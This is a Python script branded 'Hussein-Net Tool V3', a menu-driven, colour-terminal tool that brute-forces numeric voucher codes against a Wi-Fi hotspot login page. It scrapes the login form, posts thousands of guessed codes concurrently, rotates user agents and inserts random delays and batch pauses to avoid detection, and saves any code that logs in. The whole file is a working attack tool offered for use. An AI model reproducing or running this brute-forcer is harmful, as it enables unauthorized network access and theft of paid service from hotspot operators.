#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import random
import asyncio
import contextlib
import sqlite3
from urllib.parse import urljoin
from datetime import datetime


def install_package(pkg):
    try:
        __import__(pkg)
    except ImportError:
        os.system(f"{sys.executable} -m pip install {pkg} -q")


for pkg in ['aiohttp', 'bs4', 'colorama']:
    install_package(pkg)

import aiohttp
from bs4 import BeautifulSoup

R = "\033[0m"
BOLD = "\033[1m"


# ============================================================
#  CRYSTAL COLORS
# ============================================================
def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"


def crystal_color(ratio):
    ratio = max(0.0, min(1.0, ratio))
    if ratio < 0.25:
        t = ratio / 0.25
        r = int(t * 100)
        g = int(255 - t * 55)
        b = 255
    elif ratio < 0.5:
        t = (ratio - 0.25) / 0.25
        r = int(100 + t * 100)
        g = int(200 - t * 100)
        b = 255
    elif ratio < 0.75:
        t = (ratio - 0.5) / 0.25
        r = int(200 + t * 55)
        g = int(100 - t * 50)
        b = int(255 - t * 100)
    else:
        t = (ratio - 0.75) / 0.25
        r = 255
        g = int(50 + t * 205)
        b = int(155 + t * 100)
    return rgb(r, g, b)


def crystal_lines(lines):
    n = len(lines)
    out = []
    for i, line in enumerate(lines):
        ratio = i / max(n - 1, 1)
        out.append(crystal_color(ratio) + BOLD + line + R)
    return out


# ============================================================
#  LOGO: H-N + EXPLODED SKULL
# ============================================================
LOGO_LINES = [
    "  ##    ##        ###    ###        _.-=====-._        .    '    .",
    "  ##    ##       ####    ####     .'           '.     .    .    '",
    "  ##    ##       ## ##  ## ##    /   .-------.   \\   .    '    .",
    "  ##    ##       ##  ## ##  ##  |   /         \\   |  .    .    .",
    "  ########       ##   ####   ## |  |  (o) (o)  |  | .    '    .",
    "  ##    ##       ##          ## |  |     _     |  | .    .    .",
    "  ##    ##       ##          ## |  |    /_\\    |  | .    '    .",
    "  ##    ##       ##          ## |  |   |_|_|   |  | .    .    .",
    "  ##    ##       ##          ## |   \\         /   | .    '    .",
    "  ##    ##       ##          ##  \\   '-----'   /  .  .    .   .",
    "  ##    ##       ##          ##   '.         .'  .   '    .   '",
    "  ##    ##       ##          ##     '-.....-'   .   .    '   .",
    "                                  | |     | |   .   .    .   '",
    "                                  | |     | |  .   .   '   .",
    "                                  | |     | |  '  .   .   .",
    "                                 /   \\   /   \\ .   '   .   '",
    "                                /     \\ /     \\ .  .   .",
    "                               /       X       \\ ' .   '",
    "                              |       / \\       | . .",
    "                              |      /   \\      | ' .",
    "                              |     /     \\     |",
    "                              '    /       \\    '",
    "                                  /         \\",
]

TITLE_LINES = [
    "  H U S S E I N - N E T   T O O L   V 3",
]


def print_logo_ascii():
    for line in crystal_lines(LOGO_LINES):
        print(line)
    for line in crystal_lines(TITLE_LINES):
        print(line)
    print()


def print_logo():
    print_logo_ascii()


# ============================================================
#  HELPERS
# ============================================================
def clear():
    os.system('clear' if os.name != 'nt' else 'cls')


def hide_cursor():
    sys.stdout.write('\033[?25l')
    sys.stdout.flush()


def show_cursor():
    sys.stdout.write('\033[?25h')
    sys.stdout.flush()


def animated_logo():
    for i, line in enumerate(LOGO_LINES):
        ratio = i / max(len(LOGO_LINES) - 1, 1)
        sys.stdout.write(crystal_color(ratio) + BOLD + line + R + "\n")
        sys.stdout.flush()
        time.sleep(0.03)


def loading_bar(duration=2.0, width=32, label="Loading"):
    start = time.time()
    while time.time() - start < duration:
        elapsed = time.time() - start
        progress = min(elapsed / duration, 1.0)
        filled = int(progress * width)
        bar = "#" * filled + "-" * (width - filled)
        percent = int(progress * 100)
        c = crystal_color(progress)
        sys.stdout.write(f"\r  {c}{label}  [{bar}]  {percent}%{R}")
        sys.stdout.flush()
        time.sleep(0.05)
    c = crystal_color(1.0)
    sys.stdout.write(f"\r  {c}{label}  [{'#' * width}]  100%  OK{R}\n")
    sys.stdout.flush()


def spinner(duration=1.2, label="Loading"):
    frames = ["|", "/", "-", "\\"]
    start = time.time()
    i = 0
    while time.time() - start < duration:
        c = crystal_color((i % 10) / 10)
        sys.stdout.write(f"\r  {c}[{frames[i % 4]}]{R}  {c}{label}...{R}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    c = crystal_color(0.3)
    sys.stdout.write(f"\r  {c}[+]{R}  {c}{label}{R}      \n")
    sys.stdout.flush()


def box_top(w=58, ratio=0.0):
    c = crystal_color(ratio)
    sys.stdout.write(f"  {c}+" + "=" * w + f"+{R}\n")


def box_line(text="", w=58, ratio=0.5):
    text = text[:w - 2]
    padding = w - 2 - len(text)
    left = padding // 2
    right = padding - left
    c = crystal_color(ratio)
    sys.stdout.write(f"  {c}|{R}" + " " * left + c + BOLD + text + R + " " * right + f"{c}|{R}\n")


def box_divider(w=58, ratio=0.3):
    c = crystal_color(ratio)
    sys.stdout.write(f"  {c}+" + "-" * w + f"+{R}\n")


def box_bottom(w=58, ratio=0.6):
    c = crystal_color(ratio)
    sys.stdout.write(f"  {c}+" + "=" * w + f"+{R}\n")


# ============================================================
#  SCREENS
# ============================================================
def show_splash():
    clear()
    hide_cursor()
    time.sleep(0.2)
    print("\n\n")
    animated_logo()
    print()
    for line in crystal_lines(TITLE_LINES):
        print("             " + line)
    print()
    time.sleep(0.2)
    c = crystal_color(0.7)
    sys.stdout.write(f"             {c}Developer: Hussein{R}\n")
    sys.stdout.flush()
    print("\n")
    loading_bar(duration=1.5, label="Starting up")
    time.sleep(0.2)


def show_menu_screen():
    clear()
    show_cursor()
    print()
    print_logo()

    box_top(58, 0.0)
    box_line("MAIN MENU", 58, 0.4)
    box_divider(58, 0.3)
    box_line("", 58)
    box_line("[1]   Start Voucher Scan", 58, 0.1)
    box_line("", 58)
    box_line("[2]   View Saved Vouchers", 58, 0.3)
    box_line("", 58)
    box_line("[3]   Reset History", 58, 0.6)
    box_line("", 58)
    box_line("[4]   Exit", 58, 0.8)
    box_line("", 58)
    box_bottom(58, 0.6)
    print()


def show_config_screen():
    clear()
    print()
    print_logo()
    box_top(58, 0.0)
    box_line("SCAN SETTINGS", 58, 0.4)
    box_divider(58, 0.3)
    print()


def show_scan_header():
    clear()
    print()
    print_logo()
    box_top(58, 0.0)
    box_line("SCANNING VOUCHERS", 58, 0.4)
    box_divider(58, 0.3)
    print()


def show_result(voucher):
    clear()
    print()
    print_logo()
    box_top(58, 0.3)
    box_line("*** VALID VOUCHER FOUND ***", 58, 0.5)
    box_divider(58, 0.4)
    box_line("", 58)
    box_line(f"Voucher : {voucher}", 58, 0.2)
    box_line("", 58)
    box_bottom(58, 0.6)
    print()
    c = crystal_color(0.4)
    sys.stdout.write(f"  {c}Saved to: valid_vouchers.txt{R}\n")
    sys.stdout.flush()


# ============================================================
#  CONFIG
# ============================================================
DEFAULT_TARGET = "http://t.net/index.html"
DEFAULT_PREFIX = ""
DEFAULT_SUFFIX = ""
DEFAULT_VAR_DIGITS = 5
DEFAULT_MAX_ATTEMPTS = 10000

MAX_CONCURRENT = 8
REQUEST_TIMEOUT = 19
RETRY_ATTEMPTS = 2
DELAY_MIN = 0.1
DELAY_MAX = 1.2
BATCH_SIZE = 50
BATCH_REST = 10

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

SUCCESS_KEYWORDS = ["status.html", "status", "success", "welcome", "logged in", "valid", "you are logged in", "remain_bytes_total", "session_time_left", "uptime", "logged_in", "logged_in\":\"yes""logged_in': 'yes","remain_bytes_total","session_time_left","status.html", " تم تسجيل الدخول بنجاح ", "onStatusQuery"]
FAILURE_KEYWORDS = ["login", "error", "failed", "invalid", "incorrect", "wrong", "popupError"]

OUTPUT_FILE = "valid_vouchers.txt"
DB_FILE = "history.db"


class Database:
    def __init__(self, db_path=DB_FILE):
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attempted (
                number TEXT PRIMARY KEY,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def add(self, voucher):
        try:
            self.cursor.execute("INSERT OR IGNORE INTO attempted (number) VALUES (?)", (voucher,))
            self.conn.commit()
        except:
            pass

    def exists(self, voucher):
        self.cursor.execute("SELECT 1 FROM attempted WHERE number = ?", (voucher,))
        return self.cursor.fetchone() is not None

    def count_attempted(self):
        self.cursor.execute("SELECT COUNT(*) FROM attempted")
        return self.cursor.fetchone()[0]

    def reset(self):
        self.cursor.execute("DELETE FROM attempted")
        self.conn.commit()

    def close(self):
        self.conn.close()


class HusseinNetTool:
    def __init__(self, start_url, prefix, suffix, var_digits, max_attempts):
        self.start_url = start_url.rstrip('/')
        self.prefix = prefix
        self.suffix = suffix
        self.var_digits = var_digits
        self.max_attempts = max_attempts

        self.db = Database()
        self.login_url = None
        self.form_data_template = {}
        self.session = None
        self.total_attempts = self.db.count_attempted()
        self.error_count = 0
        self.start_time = None
        self.stop_event = asyncio.Event()
        self.found_voucher = None
        self.current_voucher = None

        self.queue = asyncio.Queue(maxsize=MAX_CONCURRENT * 3)
        self.workers = []

    async def init_session(self):
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar())

    async def close_session(self):
        if self.session:
            await self.session.close()
        self.db.close()

    def get_random_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }

    async def fetch_with_retry(self, method, url, **kwargs):
        for attempt in range(RETRY_ATTEMPTS):
            try:
                headers = self.get_random_headers()
                if 'headers' in kwargs:
                    headers.update(kwargs.pop('headers'))
                async with self.session.request(method, url, ssl=False, headers=headers, **kwargs) as resp:
                    if resp.status >= 400:
                        raise Exception(f"HTTP {resp.status}")
                    body = await resp.text()
                    return resp, body
            except Exception:
                if attempt == RETRY_ATTEMPTS - 1:
                    raise
                await asyncio.sleep(1)

    async def extract_login_details(self):
        try:
            resp, html = await self.fetch_with_retry('GET', self.start_url)
        except Exception:
            return False

        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form')

        if not form:
            for a in soup.find_all('a', href=True):
                href = a['href']
                if 'login' in href.lower() or 'auth' in href.lower():
                    login_url = urljoin(self.start_url, href)
                    try:
                        resp2, html2 = await self.fetch_with_retry('GET', login_url)
                        soup2 = BeautifulSoup(html2, 'html.parser')
                        form = soup2.find('form')
                        if form:
                            self.login_url = urljoin(login_url, form.get('action', '')) if form.get('action') else login_url
                            for inp in form.find_all('input'):
                                name = inp.get('name')
                                if name:
                                    self.form_data_template[name] = inp.get('value', '')
                            return True
                    except:
                        continue
                break

        if form:
            action = form.get('action', '')
            self.login_url = urljoin(self.start_url, action) if action else self.start_url
            for inp in form.find_all('input'):
                name = inp.get('name')
                if name:
                    self.form_data_template[name] = inp.get('value', '')
            return True

        show_cursor()
        manual = input(f"  {crystal_color(0.5)}Enter POST URL manually:{R} ").strip()
        hide_cursor()
        if manual:
            self.login_url = manual
            return True
        return False

    def generate_voucher(self):
        max_val = 10 ** self.var_digits - 1
        if self.db.count_attempted() >= (max_val + 1):
            return None
        for _ in range(100):
            num = random.randint(0, max_val)
            var_part = str(num).zfill(self.var_digits)
            voucher = self.prefix + var_part + self.suffix
            if not self.db.exists(voucher):
                self.db.add(voucher)
                return voucher
        for num in range(max_val + 1):
            var_part = str(num).zfill(self.var_digits)
            voucher = self.prefix + var_part + self.suffix
            if not self.db.exists(voucher):
                self.db.add(voucher)
                return voucher
        return None

    async def producer(self):
        attempts = 0
        while attempts < self.max_attempts and not self.stop_event.is_set():
            voucher = self.generate_voucher()
            if voucher is None:
                break
            await self.queue.put(voucher)
            attempts += 1
        await self.queue.put(None)

    async def worker(self, worker_id):
        try:
            await self.fetch_with_retry('GET', self.start_url)
        except:
            pass

        while not self.stop_event.is_set():
            try:
                voucher = await asyncio.wait_for(self.queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            if voucher is None:
                self.queue.task_done()
                break

            self.current_voucher = voucher
            await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

            self.total_attempts += 1

            if self.total_attempts >= self.max_attempts:
                self.stop_event.set()
                break

            if self.total_attempts % BATCH_SIZE == 0:
                await asyncio.sleep(BATCH_REST)

            data = self.form_data_template.copy()

            user_field = None
            for key in data.keys():
                if 'user' in key.lower() or 'name' in key.lower() or 'code' in key.lower() or 'voucher' in key.lower():
                    user_field = key
                    break
            if user_field is None:
                data['username'] = voucher
            else:
                data[user_field] = voucher

            for key in data.keys():
                if 'pass' in key.lower():
                    data[key] = ''

            try:
                resp, body = await self.fetch_with_retry('POST', self.login_url, data=data, allow_redirects=True)
                final_url = str(resp.url).lower()
                body_lower = body.lower()

                success = False
                for kw in SUCCESS_KEYWORDS:
                    if kw in final_url or kw in body_lower:
                        success = True
                        break
                if success:
                    for kw in FAILURE_KEYWORDS:
                        if kw in final_url or kw in body_lower:
                            success = False
                            break

                if success:
                    self.found_voucher = voucher
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f"[{datetime.now()}] Voucher: {voucher} | URL: {final_url}\n")
                    self.stop_event.set()
                    while not self.queue.empty():
                        try:
                            self.queue.get_nowait()
                            self.queue.task_done()
                        except:
                            pass
            except Exception:
                self.error_count += 1

            self.queue.task_done()

    async def ui_reporter(self):
        sys.stdout.write("\n\n\n")
        sys.stdout.write("\033[3A")
        sys.stdout.flush()

        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time if self.start_time else 0
            rate = self.total_attempts / elapsed if elapsed > 0 else 0
            percent = (self.total_attempts / self.max_attempts) * 100
            width = 32
            filled = int((percent / 100) * width)
            bar = "#" * filled + "-" * (width - filled)

            c1 = crystal_color(percent / 100)
            c2 = crystal_color(0.3)
            c3 = crystal_color(0.6)

            line1 = f"  {c1}[{bar}]  {percent:5.1f}%{R}"
            line2 = f"  {c2}Try:{R} {c1}{self.current_voucher or '---'}{R}   {c2}Rate:{R} {c3}{rate:5.1f}/s{R}"
            line3 = f"  {c2}OK:{R} {crystal_color(0.2)}{self.total_attempts}{R}   {c2}Err:{R} {crystal_color(0.9)}{self.error_count}{R}"

            sys.stdout.write("\033[K" + line1 + "\n")
            sys.stdout.write("\033[K" + line2 + "\n")
            sys.stdout.write("\033[K" + line3 + "\n")
            sys.stdout.write("\033[3A")
            sys.stdout.flush()
            await asyncio.sleep(0.3)

        sys.stdout.write("\033[3B\n")
        sys.stdout.flush()

    async def shutdown(self):
        self.stop_event.set()
        for t in self.workers:
            if not t.done():
                t.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await asyncio.gather(*self.workers, return_exceptions=True)
        await self.close_session()

    async def run(self):
        await self.init_session()

        if not await self.extract_login_details():
            show_cursor()
            print(f"  {crystal_color(0.9)}[X] Failed to connect{R}")
            await self.close_session()
            return

        show_scan_header()
        hide_cursor()

        c = crystal_color(0.2)
        sys.stdout.write(f"  {c}[+] Scan started...{R}\n\n")
        sys.stdout.flush()

        self.start_time = time.time()
        producer_task = asyncio.create_task(self.producer())
        ui_task = asyncio.create_task(self.ui_reporter())
        self.workers = [asyncio.create_task(self.worker(i)) for i in range(MAX_CONCURRENT)]

        try:
            await self.stop_event.wait()
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
            for task in [producer_task, ui_task] + self.workers:
                if not task.done():
                    task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await asyncio.gather(producer_task, ui_task, *self.workers, return_exceptions=True)

        show_cursor()
        if self.found_voucher:
            time.sleep(1)
            show_result(self.found_voucher)
        else:
            c = crystal_color(0.5)
            print(f"  {c}Done. Tried {self.total_attempts} vouchers{R}")


# ============================================================
#  MENU ACTIONS
# ============================================================
def ask_config():
    show_config_screen()
    show_cursor()

    c = crystal_color(0.5)
    print(f"  {c}Leave empty for defaults{R}\n")

    c1 = crystal_color(0.2)
    c2 = crystal_color(0.7)

    url = input(f"  {c1}Target URL{R} [{c2}{DEFAULT_TARGET}{R}]: ").strip() or DEFAULT_TARGET
    prefix = input(f"  {c1}Prefix{R} [{c2}{DEFAULT_PREFIX}{R}]: ").strip() or DEFAULT_PREFIX
    suffix = input(f"  {c1}Suffix{R} [{c2}{DEFAULT_SUFFIX}{R}]: ").strip() or DEFAULT_SUFFIX

    var_digits = input(f"  {c1}Digits{R} [{c2}{DEFAULT_VAR_DIGITS}{R}]: ").strip()
    var_digits = int(var_digits) if var_digits else DEFAULT_VAR_DIGITS

    max_attempts = input(f"  {c1}Max attempts{R} [{c2}{DEFAULT_MAX_ATTEMPTS}{R}]: ").strip()
    max_attempts = int(max_attempts) if max_attempts else DEFAULT_MAX_ATTEMPTS

    return url, prefix, suffix, var_digits, max_attempts


def view_saved():
    clear()
    print()
    print_logo()
    box_top(58, 0.0)
    box_line("SAVED VOUCHERS", 58, 0.4)
    box_divider(58, 0.3)
    box_line("", 58)

    if os.path.exists(OUTPUT_FILE):
        with open(OUTPUT_FILE, 'r') as f:
            lines = f.readlines()
        if lines:
            for line in lines[-10:]:
                box_line(line.strip()[:50], 58, 0.5)
        else:
            box_line("No vouchers saved yet", 58, 0.7)
    else:
        box_line("No saved file found", 58, 0.7)

    box_line("", 58)
    box_bottom(58, 0.6)
    print()
    show_cursor()
    input(f"  {crystal_color(0.4)}Press Enter to return...{R}")


def reset_history():
    show_cursor()
    print()
    ans = input(f"  {crystal_color(0.9)}Delete all history? (y/n):{R} ").strip().lower()
    if ans == 'y':
        db = Database()
        db.reset()
        db.close()
        print(f"  {crystal_color(0.2)}[+] History cleared{R}")
        time.sleep(1)


def main_menu():
    while True:
        show_menu_screen()
        try:
            choice = input(f"  {crystal_color(0.3)}>{R} {crystal_color(0.5)}Choose:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if choice == '1':
            url, prefix, suffix, var_digits, max_attempts = ask_config()
            tester = HusseinNetTool(url, prefix, suffix, var_digits, max_attempts)
            try:
                asyncio.run(tester.run())
            except KeyboardInterrupt:
                pass
            show_cursor()
            print()
            input(f"  {crystal_color(0.4)}Press Enter to return...{R}")

        elif choice == '2':
            view_saved()

        elif choice == '3':
            reset_history()

        elif choice == '4' or choice.lower() in ('q', 'exit'):
            clear()
            print("\n\n")
            print_logo()
            sys.stdout.write(f"     {crystal_color(0.5)}Goodbye.{R}\n\n")
            sys.stdout.flush()
            time.sleep(0.8)
            break


def main():
    try:
        show_splash()
        spinner(1.0, "Init system")
        spinner(0.7, "Load config")
        main_menu()
    except KeyboardInterrupt:
        pass
    finally:
        show_cursor()
        clear()


if __name__ == "__main__":
    main()
